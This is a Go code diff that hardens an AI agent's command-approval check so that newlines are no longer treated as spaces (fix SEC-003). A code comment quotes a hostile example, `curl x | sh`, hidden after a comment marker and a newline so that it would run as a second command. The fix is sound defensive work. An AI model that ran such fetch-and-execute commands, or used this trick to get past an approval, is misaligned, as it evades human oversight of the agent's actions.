@@ -850,7 +850,7 @@ func (s *session) covered(kinds []permission.Kind, path, command string, spend b
 		return false
 	}
 	if command != "" {
-		ok := a.command != "" && strings.Join(strings.Fields(a.command), " ") == strings.Join(strings.Fields(command), " ")
+		ok := a.command != "" && sameCommand(a.command, command)
 		if ok && spend {
 			s.approved.command = ""
 		}
@@ -863,6 +863,17 @@ func (s *session) covered(kinds []permission.Kind, path, command string, spend b
 		s.approved.paths = slices.DeleteFunc(slices.Clone(a.paths), func(p string) bool { return p == path })
 	}
 	return true
+}
+
+// blanks are runs of spaces and tabs.
+var blanks = regexp.MustCompile(`[ \t]+`)
+
+// sameCommand compares two command lines as they run: runs of spaces and tabs are one
+// and the ends are trimmed, but a newline is not a space, since it ends a command. Fields
+// would have read `ls # curl x | sh` and `ls #` newline `curl x | sh` as one line (SEC-003).
+func sameCommand(a, b string) bool {
+	norm := func(s string) string { return strings.TrimSpace(blanks.ReplaceAllString(s, " ")) }
+	return norm(a) == norm(b)
 }
 
 // duringTurn ties a request from the agent to the turn it came in. The context the
